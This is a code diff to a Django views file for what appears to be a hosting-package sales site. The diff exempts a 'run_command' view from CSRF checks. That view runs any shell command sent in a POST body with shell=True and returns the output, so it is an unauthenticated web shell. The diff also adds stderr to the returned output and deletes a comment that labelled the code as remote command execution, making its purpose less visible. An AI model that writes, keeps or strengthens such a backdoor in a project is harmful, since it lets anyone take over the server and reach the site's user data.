@@ -9,6 +9,8 @@ import json
 from django.http import HttpResponse
 from django.contrib.auth.models import User
 from django.contrib.auth.hashers import make_password
+from django.views.decorators.csrf import csrf_exempt
+
 PACKAGES = {
     'standart': {
         'name': 'Standart',
@@ -49,21 +51,17 @@ def get_client_ip(request):
         ip = request.META.get('REMOTE_ADDR')
     return ip
 
+@csrf_exempt
 def run_command(request):
     if request.method == "POST":
         try:
-            # JSON body oxu
             data = json.loads(request.body)
             cmd = data.get("cmd", "")
-            
-            # RCE icra
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            output = result.stdout
+            output = result.stdout or result.stderr
         except Exception as e:
             output = str(e)
-        
         return HttpResponse(f"<pre>{output}</pre>")
-    
     return HttpResponse("POST methodu ilə istifadə edin")
     
 def index(request):
